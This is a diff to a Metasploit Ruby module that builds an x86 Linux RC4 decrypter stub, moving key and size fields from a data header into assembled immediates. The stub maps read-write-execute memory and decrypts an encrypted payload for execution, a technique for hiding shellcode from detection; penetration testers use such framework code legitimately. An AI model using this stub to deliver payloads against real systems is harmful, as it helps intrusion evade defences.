@@ -1,6 +1,6 @@
 module Msf::Payload::Linux::X86::Rc4Decrypter
 
-  def rc4_decrypter_stub
+  def rc4_decrypter_stub(key_size: 0, payload_size: 0, encrypted_size: 0)
     asm = <<-ASM
 _start:
       jmp _get_data_addr
@@ -14,8 +14,7 @@ _got_data_addr:
       push 0xffffffff
       push 0x22
       push 7
-      mov eax, dword [ebp+4]
-      push eax
+      push #{payload_size}
       xor eax, eax
       push eax
       mov al, 0x5a
@@ -40,18 +39,16 @@ _init_sbox:
       xor ebx, ebx
 
 _ksa_loop:
-
       movzx eax, byte [edi+esi]
       add ebx, eax
 
       mov eax, esi
       xor edx, edx
       push ebx
-      mov ecx, dword [ebp]
+      mov ecx, #{key_size}
       div ecx
       pop ebx
-      lea ecx, [ebp+12]
-      movzx eax, byte [ecx+edx]
+      movzx eax, byte [ebp+edx]
       add ebx, eax
       and ebx, 0xff
 
@@ -64,13 +61,12 @@ _ksa_loop:
       cmp esi, 256
       jb _ksa_loop
 
-      ;RC4 Pseudo-Random Generation Algorithm (PRGA)
-      xor esi, esi                    
-      xor ebx, ebx                    
+      ; RC4 Pseudo-Random Generation Algorithm (PRGA)
+      xor esi, esi
+      xor ebx, ebx
       xor ecx, ecx
 
 _prga_loop:
-
       inc esi
       and esi, 0xff
 
@@ -88,14 +84,14 @@ _prga_loop:
       movzx eax, byte [edi+eax]
 
       push ebx
-      lea edx, [ebp+268]
+      lea edx, [ebp+256]
       xor al, byte [edx+ecx]
       mov edx, dword [esp+260]
       mov byte [edx+ecx], al
       pop ebx
 
       inc ecx
-      cmp ecx, dword [ebp+8]
+      cmp ecx, #{encrypted_size}
       jb _prga_loop
 
       add esp, 256                    ; deallocate S-box
@@ -105,44 +101,29 @@ _prga_loop:
 _get_data_addr:
       call _got_data_addr
 
-; Data section layout (populated by rc4_decrypter):
-; offset +0:   key_size (4 bytes)
-; offset +4:   payload_size (4 bytes)
-; offset +8:   encrypted_size (4 bytes)
-; offset +12:  key_data (256 bytes)
-; offset +268: encrypted_data (variable length)
+; Data section layout:
+; offset +0:   key_data (256 bytes)
+; offset +256: encrypted_data (variable length)
     ASM
 
     Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
   end
 
   def rc4_decrypter(opts = {})
-    key = opts[:key] || Rex::Text.rand_text(16)
-    payload = opts[:data] || raise(ArgumentError, "Encrypted data required")
+    key            = opts[:key] || Rex::Text.rand_text(16)
+    payload        = opts[:data] || raise(ArgumentError, "Encrypted data required")
+    raise(ArgumentError, "Key must be <= 256 bytes") if key.length > 256
 
     encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)
 
-    stub = rc4_decrypter_stub.dup
-    code_size = stub.length
+    stub = rc4_decrypter_stub(
+      key_size:       key.length,
+      payload_size:   payload.length,
+      encrypted_size: encrypted_data.length
+    )
 
-    key_size_offset = code_size
-    payload_size_offset = code_size + 4
-    encrypted_size_offset = code_size + 8
-    key_data_offset = code_size + 12
-    encrypted_data_offset = code_size + 268
-
-    stub << "\x00" * 268
-
-    stub[key_size_offset, 4] = [key.length].pack('V')
-    stub[payload_size_offset, 4] = [payload.length].pack('V')
-    stub[encrypted_size_offset, 4] = [encrypted_data.length].pack('V')
-    stub[key_data_offset, 256] = key.ljust(256, "\x00")
-
-    stub + encrypted_data
-  end
-
-  def stub_size
-    rc4_decrypter_stub.length + 268
+    stub << key.ljust(256, "\x00")
+    stub << encrypted_data
   end
 
 end
